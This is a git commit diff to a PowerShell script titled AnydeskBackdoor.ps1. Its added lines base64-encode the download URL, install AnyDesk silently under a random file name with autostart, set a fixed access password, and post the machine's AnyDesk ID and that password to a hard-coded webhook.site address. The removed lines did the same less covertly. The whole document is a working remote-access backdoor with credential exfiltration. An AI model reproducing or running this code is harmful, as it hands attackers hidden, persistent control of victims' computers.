537da634c5b5a5e4e1b9d7ba48b5b8e343ada02f
Daniel Abay <35191867+Ab4y98@users.noreply.github.com>
2025-04-17 22:04:37 +0300

    Update AnydeskBackdoor.ps1

--- AnydeskBackdoor.ps1
+++ AnydeskBackdoor.ps1
@@ -1,19 +1,7 @@
-$url = "https://download.anydesk.com/AnyDesk.exe"
-$outputPath = "C:\AnyDesk.exe"
+$u=([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9kb3dubG9hZC5hbnlkZXNrLmNvbS9BbnlEZXNrLmV4ZQ==")));
+$o="$env:PUBLIC\"+(-join ([char[]](65..90+97..122)|Get-Random -Count 8))+".exe";
+Invoke-WebRequest -Uri $u -OutFile $o;Start-Process -FilePath $o -ArgumentList "--install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent";
+Start-Sleep -Seconds 5;cmd /c "echo Aa123456! | "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --set-password";
 
-Invoke-WebRequest -Uri $url -OutFile $outputPath
 
-C:\AnyDesk.exe --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent
-
-Start-Sleep -Seconds 5
-
-cmd /c 'echo Aa123456! | "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --set-password'
-
-Start-Process -FilePath "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" -ArgumentList "--get-id" -RedirectStandardOutput "C:\Program Files (x86)\AnyDesk\AnyDesk_Output.txt" -NoNewWindow -Wait
-
-$ID = Get-Content -Path "C:\Program Files (x86)\AnyDesk\AnyDesk_Output.txt" | ForEach-Object { $_.Trim() }
-
-$webhookUrl = Read-Host -Prompt 'Input the Webhook URL: '
-
-# Send the request to the webhook
-Invoke-WebRequest -Uri $webhookUrl -Method Post -Body "AnyDesk ID is: $ID AND Password is: Aa123456!"
+$cf="C:\ProgramData\AnyDesk\system.conf"; if(Test-Path $cf){$l=Get-Content $cf|Where-Object{$_ -like "ad.anynet.id=*"};if($l){$i=$l -replace "ad.anynet.id=",""}else{$i="unknown"};$msg="AnyDesk ID is: $i AND Password is: Aa123456!";$wu="https://webhook.site/ea714bfe-49fa-4482-af6c-6bbddc75ec15";Invoke-WebRequest -Uri $wu -Method Post -Body $msg}
